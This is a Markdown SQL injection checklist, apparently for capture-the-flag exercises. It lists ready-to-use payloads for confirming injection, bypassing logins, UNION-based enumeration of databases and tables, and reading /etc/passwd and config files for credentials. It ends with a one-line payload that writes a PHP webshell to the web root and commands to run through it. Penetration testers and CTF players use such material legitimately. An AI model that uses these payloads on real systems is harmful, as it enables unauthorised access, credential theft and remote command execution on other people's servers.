# SQL Injection Checklist

## Discovery
- [ ] Inject `'` into every input field — `500` = injectable, `302/error message` = runs but fails
- [ ] Confirm injection with `' OR SLEEP(5)-- -` — 5s delay = confirmed; fast = parameterized
- [ ] Test ALL input fields including hidden/non-obvious ones (invitation codes, search, profile fields)
- [ ] Check both GET params and POST body fields

## Auth Bypass
- [ ] Try `admin'-- -` (comment out password check)
- [ ] Try `admin')-- -` if query uses parentheses
- [ ] Try `' OR '1'='1` (no comment — uses original closing quote)
- [ ] Try OR in password field too: `something' OR '1'='1`
- [ ] For invitation codes / access codes: prefix with valid-format string before injecting
  - e.g. `xxxx-xxxx-1111' or '1'='1`
- [ ] Try `' OR id=N)-- -` to log in as specific user

## UNION Injection — Column Count
- [ ] Use `ORDER BY` to count: `' ORDER BY 1-- -`, `' ORDER BY 2-- -` ... until error
- [ ] Confirm with `' UNION SELECT 1,2,3,4-- -` (use correct column count)
- [ ] Identify which columns are printed to page (replace numbers with `@@version`)

## UNION Injection — Enumeration
- [ ] Get current DB: `' UNION SELECT 1,2,database(),4-- -`
- [ ] List all DBs: query `INFORMATION_SCHEMA.SCHEMATA`
- [ ] List tables: query `INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'`
- [ ] List columns: query `INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'`
- [ ] Dump target data: `SELECT col FROM db.table WHERE condition`

## File Read
- [ ] Confirm user: `user()` or `SELECT user FROM mysql.user`
- [ ] Confirm FILE privilege: query `information_schema.user_privileges`
- [ ] Check `secure_file_priv`: empty = can read/write anywhere; NULL = blocked
- [ ] Read `/etc/passwd` to confirm Linux and file read works
- [ ] Read app config: `config.php`, `db.php`, `conn.php` for DB credentials
- [ ] Read web server config to find web root:
  - `/etc/nginx/sites-enabled/default`
  - `/etc/apache2/apache2.conf`

## File Write / RCE
- [ ] Write webshell: `UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/webroot/shell.php'-- -`
- [ ] Verify shell exists: browse to `/shell.php?0=id`
- [ ] Find flag: `?0=find / -name "flag_*" 2>/dev/null`
- [ ] Cat flag: `?0=cat /path/to/flag.txt`

## Key Pitfalls
- [ ] Login form not injectable? Check OTHER fields — registration codes, search, profile
- [ ] OR 1=1 gives 500? Table may be empty (OR on empty table = 0 rows) — try UNION instead
- [ ] OR injection causing 500 on multi-step form? A second query (UPDATE) may re-use the injected input
- [ ] Valid-format prefix needed? Some fields validate format before SQL — prefix with valid-looking data
- [ ] Always count columns before UNION — wrong count = 500
